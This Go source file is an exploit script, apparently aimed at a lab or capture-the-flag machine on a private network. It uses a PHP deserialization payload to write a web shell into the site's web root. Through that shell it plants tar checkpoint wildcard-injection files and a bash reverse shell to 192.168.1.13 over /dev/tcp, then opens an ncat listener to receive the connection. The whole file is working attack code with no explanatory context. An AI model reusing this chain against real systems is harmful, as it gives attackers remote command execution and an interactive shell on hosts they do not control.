package main

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/exec"
)

func SendRequest(method string, urlstr string, data string) {
	PostData := url.Values{}
	PostData.Set("param", data)
	PostByte := []byte(PostData.Encode())
	req, err := http.NewRequest(method, urlstr, bytes.NewReader(PostByte))
	if err != nil {
		fmt.Println(err)
		return
	}
	client := &http.Client{}
	if method == "POST" {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Print(err)
	}
	defer func(Body io.ReadCloser) {
		err := Body.Close()
		if err != nil {
		}
	}(resp.Body)
}

func main() {
	var OriginData string = "http://192.168.1.20/index.php"
	var payload1 string = `O:3:"Log":2:{s:8:"filename";s:32:"/var/www/html/scriptz/shell3.php";s:4:"data";s:54:"<?php echo "<p>"; system($_GET["ok"]); echo "<p\>"; ?>";}`
	var shellUrl string = "http://192.168.1.20/scriptz/shell3.php?ok="
	var payload2 string = url.QueryEscape(`touch "/home/rene/backup/--checkpoint-action=exec=sh shell3.sh"`)
	var payload3 string = url.QueryEscape(`touch "/home/rene/backup/--checkpoint=1"`)
	var payload4 string = url.QueryEscape(`echo "bash -c 'exec bash -i &>/dev/tcp/192.168.1.13/20001 <&1'" > /home/rene/backup/shell3.sh`)
	var payload5 string = url.QueryEscape(`chmod +x /home/rene/backup/shell3.sh`)
	SendRequest("POST", OriginData, payload1)
	fmt.Println("Writing Webshell Done...")
	SendRequest("GET", shellUrl+payload2, "")
	SendRequest("GET", shellUrl+payload3, "")
	SendRequest("GET", shellUrl+payload4, "")
	SendRequest("GET", shellUrl+payload5, "")
	fmt.Println("Ready for Getting reverse shell....")
	cmd := exec.Command("ncat", "-lvvp", "20001")
	cmd.Stdout = os.Stdout
	cmd.Stdin = os.Stdin
	cmd.Stderr = os.Stderr
	_ = cmd.Run()
}
